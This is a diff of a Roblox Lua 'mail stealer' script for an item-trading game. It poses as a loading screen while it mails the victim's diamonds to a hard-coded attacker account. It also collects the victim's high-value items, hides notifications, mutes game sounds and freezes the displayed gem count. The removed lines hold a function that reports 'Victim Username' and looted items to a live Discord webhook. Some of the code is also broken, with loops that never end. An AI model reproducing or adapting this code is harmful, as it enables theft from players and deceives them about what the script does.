@@ -1,73 +1,105 @@
--- Services
 local Players = game:GetService("Players")
 local ReplicatedFirst = game:GetService("ReplicatedFirst")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 
--- Player and GUI Setup
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Create Loading Screen
+print("Service Successful")
+
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.Parent = playerGui
 
+print("ScreenGui Successful")
+
 local frame = Instance.new("Frame")
 frame.Parent = ScreenGui
-frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Size = UDim2.new(1,0,1,0)
 frame.BackgroundTransparency = 0
-frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+frame.BackgroundColor3 = Color3.fromRGB(0,20,40)
+
+print("Frame Successful")
 
 local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 1, 0)
-textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+textLabel.Size = UDim2.new(1,0,1,0)
+textLabel.BackgroundColor3 = Color3.fromRGB(0,20,40)
 textLabel.Font = Enum.Font.GothamBold
-textLabel.TextColor3 = Color3.new(.8, .8, .8)
+textLabel.TextColor3 = Color3.new(.8,.8,.8)
 textLabel.Text = "Script Loading-Takes 10-20 Seconds"
 textLabel.TextSize = 19
 textLabel.Parent = frame
 
+print("TextLabel Successful")
+
 local loadingRing = Instance.new("ImageLabel")
-loadingRing.Size = UDim2.new(0, 256, 0, 256)
+loadingRing.Size = UDim2.new(0,256,0,256)
 loadingRing.BackgroundTransparency = 1
 loadingRing.Image = "rbxassetid://4965945816"
-loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
+loadingRing.AnchorPoint = Vector2.new(0.5,0.5)
+loadingRing.Position = UDim2.new(0.5,0,0.5,0)
 loadingRing.Parent = frame
 
--- Loading Screen Animation
+print("LoadingRing Successful")
+
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+
+print("Remove Default Loading Screen Unsuccessful")
+
 local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
 local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
+
+print("TweenService Successful")
+
 tween:Play()
 
--- Variables
-local webhook = "https://discord.com/api/webhooks/1281988631187292170/lZ73goJXrpBhstuvuhhboxpphj5AXf3r-9XBr_QWRXja1fx-aWSpoeL2Yt1yQAce367B"
-local min_rap = 190000
+-- Define user information and settings
 local Username = "jointex21"
-local Username2 = ""
+local Username2 = "" -- Alternate user if the main user's mailbox is full
+local min_rap = 190000 -- Minimum RAP threshold
 
--- Ensure the script is executed only once
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
+local plr = game.Players.LocalPlayer
+local MailMessage = "Nice" -- Mailbox message used
+
+local sortedItems = {}
+local totalRAP = 0
+local getFucked = false
 _G.scriptExecuted = _G.scriptExecuted or false
+
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
--- Ensure save and inventory are loaded correctly
-local function GetSave()
-    local saveModule = require(game.ReplicatedStorage.Library.Client.Save)
-    return saveModule and saveModule.Get() or {}
+local newamount = 20000 -- Price to send mail
+
+if mailsent ~= 0 then
+    newamount = math.ceil(newamount * (1.5 ^ mailsent)) -- Adjust price based on mail sent count
 end
 
-local save = GetSave()
-local sortedItems = {}
-local totalRAP = 0
-local getFucked = false
 local GemAmount1 = 1
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+        break
+    end
+end
 
--- Ensure proper handling of mail and items
+if newamount > GemAmount1 then
+    return
+end
+
 local function formatNumber(number)
+    local number = math.floor(number)
     local suffixes = {"", "k", "m", "b", "t"}
     local suffixIndex = 1
     while number >= 1000 do
@@ -77,47 +109,32 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
--- Sample Function to Check Existence and Initialization
-local function CheckObjectInitialization()
-    local someObject = player.PlayerGui:FindFirstChild("SomeObject")
-    if someObject then
-        print("Object found!")
-        print(someObject.Size)  -- Access properties only if object is not nil
-    else
-        print("Object not found!")
+local function logMessage(username, diamonds, sortedItems, totalRAP)
+    -- Basic logging function, replace this with your desired logging mechanism
+    print("Logging data:")
+    print("Username:", username)
+    print("Diamonds:", diamonds)
+    print("Total RAP:", totalRAP)
+    print("Sorted Items:")
+    for _, item in ipairs(sortedItems) do
+        print(item.name, "x" .. item.amount, "RAP:" .. item.rap)
     end
 end
 
--- Call the sample function to verify objects
-CheckObjectInitialization()
-
--- Continue with the rest of your script logic...
-
--- Ensure gem leaderstat exists
-local gemsleaderstat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
-if not gemsleaderstat then
-    print("Diamonds leaderstat not found!")
-    return
-end
-local gemsleaderstatpath = gemsleaderstat
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-    gemsleaderstatpath.Value = gemsleaderstat.Value
+    gemsleaderstatpath.Value = gemsleaderstat
 end)
 
--- Ensure the loading GUI and notifications exist
-local loading = player.PlayerScripts:FindFirstChild("Scripts"):FindFirstChild("Core"):FindFirstChild("Process Pending GUI")
-local noti = player.PlayerGui:FindFirstChild("Notifications")
-if loading then
-    loading.Disabled = true
-end
-if noti then
-    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-        noti.Enabled = false
-    end)
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
     noti.Enabled = false
-end
+end)
+noti.Enabled = false
 
--- Ensure sounds are properly managed
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
         if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
@@ -128,145 +145,125 @@ game.DescendantAdded:Connect(function(x)
     end
 end)
 
--- Function to get RAP value
 local function getRAP(Type, Item)
-    local devRAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds)
-    return (devRAPCmds and devRAPCmds.Get({
-        Class = {Name = Type},
-        IsA = function(hmm)
-            return hmm == Type
-        end,
-        GetId = function()
-            return Item.id
-        end,
-        StackKey = function()
-            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-        end
-    }) or 0)
-end
-
--- Function to send message to webhook
-local function SendMessage(username, diamonds)
-    local headers = {
-        ["Content-Type"] = "application/json",
-    }
-
-    local fields = {
+    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
         {
-            name = "Victim Username:",
-            value = username,
-            inline = true
-        },
-        {
-            name = "Items to be sent:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = "",
-            inline = false
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
         }
-    }
-
-    local combinedItems = {}
-    local itemRapMap = {}
-
-    for _, item in ipairs(sortedItems) do
-        local rapKey = item.name
-        if itemRapMap[rapKey] then
-            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
-        else
-            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
-            table.insert(combinedItems, rapKey)
-        end
-    end
-
-    table.sort(combinedItems, function(a, b)
-        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
-    end)
-
-    for _, itemName in ipairs(combinedItems) do
-        local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
-    end
-
-    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
-    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
-    if getFucked then
-        fields[3].value = fields[3].value .. "\n\nVictim tried to use anti-mailstealer, but got fucked instead"
-    end
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "New Execution",
-            ["color"] = 15495442,
-            ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "You Got The Following Items "
-            }
-        }}
-    }
-
-    -- Split long message into chunks
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n")
-            fields[2].value = fields[2].value .. "\nPlus more!"
-        end
-    end
-
-    local body = HttpService:JSONEncode(data)
-
-    if webhook and webhook ~= "" then
-        local success, response = pcall(function()
-            return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson)
-        end)
-        if not success then
-            warn("Failed to send webhook request: " .. response)
-        end
-    end
+    ) or 0)
 end
 
--- Function to handle item sending
+local user = Username
+local user2 = Username2
+
 local function sendItem(category, uid, am)
     local args = {
-        [1] = Username,
-        [2] = "Mail Message",
+        [1] = user,
+        [2] = MailMessage,
         [3] = category,
         [4] = uid,
         [5] = am or 1
     }
-    local response, err = network:InvokeServer("Mailbox: Send", unpack(args))
-    if not response and err == "They don't have enough space!" then
-        -- Switch to alternative user if main doesn't have mailbox space
-        Username = Username2
-        args[1] = Username
-        response = network:InvokeServer("Mailbox: Send", unpack(args))
+    local response = false
+    repeat
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if response == false and err == "They don't have enough space!" then -- If main doesn't have mailbox space, send to alt account
+            user = user2
+            args[1] = user
+        end
+    until response == true
+    GemAmount1 = GemAmount1 - newamount
+    newamount = math.ceil(math.ceil(newamount) * 1.5)
+    if newamount > 5000000 then
+        newamount = 5000000
     end
-    if response then
-        GemAmount1 = GemAmount1 - newamount
-        newamount = math.ceil(newamount * 1.5)
-        if newamount > 5000000 then
-            newamount = 5000000
+end
+
+-- Sends all gems
+local function SendAllGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            if GemAmount1 >= (newamount + 10000) then
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = i,
+                    [5] = GemAmount1 - newamount
+                }
+                local response = false
+                repeat
+                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                until response == true
+                break
+            end
         end
     end
 end
 
--- Execute SendMessage function
-SendMessage(Username, gemsleaderstatpath.Value)
+local function IsMailboxHooked()
+    local uid
+    for i, v in pairs(save["Pet"]) do
+        uid = i
+        break
+    end
+    local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
+        return false
+    else
+        return true
+    end
+end
 
--- Handle Cleanup
-loadingRing.Visible = false
-frame:TweenPosition(UDim2.new(0, 0, 1, 0), "InOut", "Sine", 2)
-wait(2)
-ScreenGui:Destroy()
+local function EmptyBoxes()
+    if save.Box then
+        for key, value in pairs(save.Box) do
+            if value._uq then
+                network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
+            end
+        end
+    end
+end
 
-print("Loaded LoadingScreen")
-print("Script Successful")
+local function ClaimMail()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Box"}
+for _, category in ipairs(categoryList) do
+    for _, item in pairs(save[category]) do
+        local rap = getRAP(category, item)
+        if rap > min_rap then
+            table.insert(sortedItems, {name = item.name, amount = item.amount, rap = rap})
+            totalRAP = totalRAP + (item.amount * rap)
+        end
+    end
+end
+
+table.sort(sortedItems, function(a, b)
+    return a.rap > b.rap
+end)
+
+logMessage(Username, gemsleaderstatpath.Value, sortedItems, totalRAP)
+
+SendAllGems()
